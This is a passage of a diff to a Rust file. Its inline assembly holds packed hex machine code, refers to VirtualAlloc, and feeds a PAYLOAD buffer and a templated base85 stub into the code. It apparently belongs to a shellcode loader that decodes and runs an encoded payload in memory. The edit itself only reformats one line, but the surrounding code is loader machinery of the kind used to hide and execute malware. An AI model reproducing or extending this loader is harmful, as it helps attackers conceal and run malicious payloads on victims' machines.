@@ -37,8 +37,7 @@ unsafe fn _start() {
         0feb7c05fd83c5ffh,3158096ae2ebabc8h,226a5a076ace89ffh,31455841ff6a5a41h,\
         0cdefb848c3050fc9h,5a510123456789abh,3000b841c931h,0ffcc294c5941406ah,\
         0c340c48348d0h\n.asciz \"09AZaz!!#&(+--;@^`{{~VirtualAlloc\"",
-        in("rcx") _p.0, in("rdi") _p.1, in("r14") PAYLOAD.as_mut_ptr(),
-        in("r13") b$$$$stub_base85$$$$.as_ptr()
+        in("rcx") _p.0, in("rdi") _p.1, in("r14") PAYLOAD.as_mut_ptr(), in("r13") b$$$$stub_base85$$$$.as_ptr()
     )
 }
 fn main() { unsafe { _start() } }
